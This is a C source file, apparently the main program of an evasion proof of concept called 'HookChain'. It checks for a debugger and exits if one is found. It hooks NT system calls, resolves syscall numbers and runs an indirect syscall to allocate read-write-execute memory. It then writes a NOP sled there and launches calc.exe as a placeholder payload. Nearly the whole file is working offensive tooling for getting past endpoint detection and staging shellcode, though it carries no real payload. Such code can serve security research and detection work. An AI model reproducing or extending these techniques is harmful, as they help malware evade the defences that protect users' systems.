#include <hookchain.h>
#include <shellcode.h>
#include <time.h>
#include <wincrypt.h>

// Global hook chain
HOOK_CHAIN g_chain;


// Hook Functions


PVOID Hook_NtCreateFile() {
    DebugPrint("[+] NtCreateFile intercepted!");
    return (PVOID)(ULONG_PTR)0xC0000005;
}

PVOID Hook_NtWriteFile() {
    DebugPrint("[+] NtWriteFile intercepted!");
    return (PVOID)(ULONG_PTR)0x00000000;
}

PVOID Hook_NtReadFile() {
    DebugPrint("[+] NtReadFile intercepted!");
    return (PVOID)(ULONG_PTR)0x00000000;
}

PVOID Hook_NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    (void)ProcessHandle;
    (void)ZeroBits;
    
    DebugPrint("[+] NtAllocateVirtualMemory intercepted!");
    DebugPrint("[+] RegionSize: %zu", RegionSize ? *RegionSize : 0);
    DebugPrint("[+] AllocationType: 0x%x", AllocationType);
    DebugPrint("[+] Protect: 0x%x", Protect);
    
    *BaseAddress = VirtualAlloc(*BaseAddress, *RegionSize, AllocationType, Protect);
    if (*BaseAddress) {
        DebugPrint("[+] VirtualAlloc succeeded: 0x%p", *BaseAddress);
        return (PVOID)(ULONG_PTR)0x00000000;
    }
    
    DWORD error = GetLastError();
    DebugPrint("[-] VirtualAlloc failed: %d", error);
    return (PVOID)(ULONG_PTR)0xC0000005;
}

PVOID Hook_NtOpenProcess() {
    DebugPrint("[+] NtOpenProcess intercepted!");
    return (PVOID)(ULONG_PTR)0xC0000022;
}

PVOID Hook_NtCreateThreadEx() {
    DebugPrint("[+] NtCreateThreadEx intercepted!");
    return (PVOID)(ULONG_PTR)0xC0000022;
}


// Main Entry Point


int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] HookChain Advanced Project v2.0");
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Built with: 40%% C + 60%% Assembly");
    DebugPrint("[+] ========================================");
    
    if (IsDebuggerPresentEx()) {
        DebugPrint("[-] Debugger detected! Exiting...");
        return 0;
    }
    
    if (IsProcessElevated()) {
        DebugPrint("[+] Running with elevated privileges");
    } else {
        DebugPrint("[-] Not running with elevated privileges");
    }
    
    DWORD build = GetWindowsBuildNumber();
    DebugPrint("[+] Windows Build: %d", build);
    
    if (IsWindows10()) {
        DebugPrint("[+] Windows 10 detected");
    } else if (IsWindows11()) {
        DebugPrint("[+] Windows 11 detected");
    }
    
    DebugPrint("[+] ========================================");
    
    if (!HookChain_Initialize(&g_chain, 20)) {
        DebugPrint("[-] Failed to initialize hook chain");
        return 1;
    }
    
    DebugPrint("[+] Hook chain initialized");
    DebugPrint("[+] ntdll base: 0x%p", g_chain.ntdll_base);
    DebugPrint("[+] syscall gadget: 0x%p", g_chain.syscall_gadget);
    
    if (!IAT_InitializeList(&g_iat_list, 20)) {
        DebugPrint("[-] Failed to initialize IAT hook list");
        HookChain_Cleanup(&g_chain);
        return 1;
    }
    DebugPrint("[+] IAT list initialized");
    
    DebugPrint("[+] Adding hooks...");
    
    if (!HookChain_AddHook(&g_chain, "NtCreateFile", Hook_NtCreateFile, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtCreateFile hook");
    } else {
        DebugPrint("[+] Added NtCreateFile hook");
    }
    
    if (!HookChain_AddHook(&g_chain, "NtWriteFile", Hook_NtWriteFile, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtWriteFile hook");
    } else {
        DebugPrint("[+] Added NtWriteFile hook");
    }
    
    if (!HookChain_AddHook(&g_chain, "NtReadFile", Hook_NtReadFile, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtReadFile hook");
    } else {
        DebugPrint("[+] Added NtReadFile hook");
    }
    
    if (!HookChain_AddHook(&g_chain, "NtAllocateVirtualMemory", Hook_NtAllocateVirtualMemory, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtAllocateVirtualMemory hook");
    } else {
        DebugPrint("[+] Added NtAllocateVirtualMemory hook");
    }
    
    if (!HookChain_AddHook(&g_chain, "NtOpenProcess", Hook_NtOpenProcess, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtOpenProcess hook");
    } else {
        DebugPrint("[+] Added NtOpenProcess hook");
    }
    
    if (!HookChain_AddHook(&g_chain, "NtCreateThreadEx", Hook_NtCreateThreadEx, HOOK_TYPE_SYSCALL)) {
        DebugPrint("[-] Failed to add NtCreateThreadEx hook");
    } else {
        DebugPrint("[+] Added NtCreateThreadEx hook");
    }
    
    DebugPrint("[+] Total hooks added: %d", HookChain_GetHookCount(&g_chain));
    HookChain_DumpHooks(&g_chain);
    
    if (!HookChain_EnableHooks(&g_chain)) {
        DebugPrint("[-] Failed to enable hooks");
        HookChain_Cleanup(&g_chain);
        IAT_Cleanup();
        return 1;
    }
    DebugPrint("[+] Hooks enabled successfully!");
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Testing SSN Resolution");
    DebugPrint("[+] ========================================");
    
    const char *test_funcs[] = {
        "NtCreateFile",
        "NtWriteFile",
        "NtReadFile",
        "NtAllocateVirtualMemory",
        "NtOpenProcess",
        "NtCreateThreadEx"
    };
    
    for (int i = 0; i < 6; i++) {
        DWORD ssn = SSN_ResolveByName(test_funcs[i]);
        DebugPrint("[+] SSN for %s: 0x%02x (%d)", test_funcs[i], ssn, ssn);
    }
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Testing Syscall Execution");
    DebugPrint("[+] ========================================");
    
    DWORD ssn = SSN_ResolveByName("NtAllocateVirtualMemory");
    DebugPrint("[+] SSN for NtAllocateVirtualMemory: 0x%x", ssn);
    
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddr = NULL;
    SIZE_T regionSize = 0x1000;
    ULONG zeroBits = 0;
    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
    ULONG protect = PAGE_EXECUTE_READWRITE;
    
    DebugPrint("[+] Allocating 0x%x bytes of memory...", regionSize);
    DebugPrint("[+] ProcessHandle: 0x%p", hProcess);
    DebugPrint("[+] BaseAddress: 0x%p", baseAddr);
    DebugPrint("[+] RegionSize: %zu", regionSize);
    DebugPrint("[+] AllocationType: 0x%x", allocationType);
    DebugPrint("[+] Protect: 0x%x", protect);
    
    DWORD result = (DWORD)(ULONG_PTR)HookChain_ExecuteSyscall(
        &g_chain,
        ssn,
        hProcess,
        &baseAddr,
        zeroBits,
        &regionSize,
        allocationType,
        protect
    );
    
    DebugPrint("[+] Syscall result: 0x%08x", result);
    if (result == 0) {
        DebugPrint("[+] SUCCESS: Memory allocated at: 0x%p", baseAddr);
        DebugPrint("[+] Size: %zu bytes", regionSize);
        
        if (baseAddr) {
            memset(baseAddr, 0x90, regionSize);
            DebugPrint("[+] Wrote NOP sled (0x90) to allocated memory");
        }
    } else {
        DebugPrint("[-] FAILED to allocate memory (NTSTATUS: 0x%08x)", result);
    }
    
    
    // LAUNCH CALC.EXE USING system()
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Launching calc.exe");
    DebugPrint("[+] ========================================");
    
    DebugPrint("[+] Opening calculator...");
    system("calc.exe");
    
    DebugPrint("[+] calc.exe should be open now!");
    DebugPrint("[+] If not, the system() call may be blocked");
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Cleaning up...");
    
    HookChain_DisableHooks(&g_chain);
    HookChain_Cleanup(&g_chain);
    IAT_Cleanup();
    
    DebugPrint("[+] ========================================");
    DebugPrint("[+] Done! Exiting...");
    DebugPrint("[+] ========================================");
    
    return 0;
}